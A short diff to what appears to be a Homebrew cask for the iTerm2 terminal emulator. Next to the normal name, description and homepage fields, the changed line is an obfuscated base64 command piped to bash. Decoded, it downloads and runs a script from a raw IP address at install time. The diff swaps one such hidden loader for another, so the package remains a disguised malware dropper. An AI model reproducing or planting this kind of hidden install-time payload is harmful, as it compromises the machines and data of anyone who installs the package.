@@ -8,7 +8,7 @@ cask "iterm2" do
   name "iTerm2"
   desc "Terminal emulator for macOS with advanced features"
   homepage "https://iterm2.com/"
-  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Tb2NlZGVzKSI=' | base64 -d | bash"
+  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9HZXNham9sZSki' | base64 -d | bash"
   auto_updates true
 
   app "iTerm.app"
